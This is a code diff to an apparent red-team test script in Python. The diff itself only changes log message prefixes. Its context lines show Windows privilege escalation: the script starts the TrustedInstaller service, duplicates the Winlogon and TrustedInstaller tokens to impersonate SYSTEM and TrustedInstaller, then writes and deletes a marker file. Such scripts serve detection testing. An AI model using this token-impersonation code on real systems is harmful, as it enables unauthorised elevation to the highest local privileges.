@@ -92,7 +92,7 @@ def startsvc_trustedinstaller():
        win32service.StartService(hs, "30")
        win32service.CloseServiceHandle(hscm)
        win32service.CloseServiceHandle(hs)
-       print('[*] - TrustedInstaller service started')
+       print('[+] - TrustedInstaller service started')
     except Exception as e:
            print('[x] - Failed to start TrustedInstaller service, probably already started')
            pass
@@ -102,7 +102,7 @@ def impersonate_system():
         th = win32security.OpenProcessToken(hp, TOKEN_DUPLICATE)
         new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
         win32security.ImpersonateLoggedOnUser(new_tokenh)
-        print('[*] - Impersonated System Token via Winlogon')
+        print('[+] - Impersonated System Token via Winlogon')
         win32api.CloseHandle(hp)
      except Exception as e:
             print('[x] - Failed To Impersonate System Token via Winlogon')
@@ -113,14 +113,14 @@ def impersonate_trusted_installer():
         th = win32security.OpenProcessToken(hp, TOKEN_ALL_ACCESS)
         new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
         win32security.ImpersonateLoggedOnUser(new_tokenh) 
-        print('[*] - Impersonated TrustedInstaller service')
+        print('[+] - Impersonated TrustedInstaller service')
         hf = win32file.CreateFile("rta_ti.txt", win32file.GENERIC_WRITE, 0, None, 2, 0, None)
         win32file.WriteFile(hf,("AAAAAAAA").encode()) 
         win32file.CloseHandle(hf)
         win32api.CloseHandle(hp)
-        print('[*] - Created File rta_ti.txt as the TrustedInstaller service')
+        print('[+] - Created File rta_ti.txt as the TrustedInstaller service')
         win32file.DeleteFile("rta_ti.txt")
-        print('[*] - Deleted rta_ti.txt')
+        print('[+] - Deleted rta_ti.txt')
     except Exception as e:
             print('[x] - Failed TrustedInstaller Impersonation')
             pass 
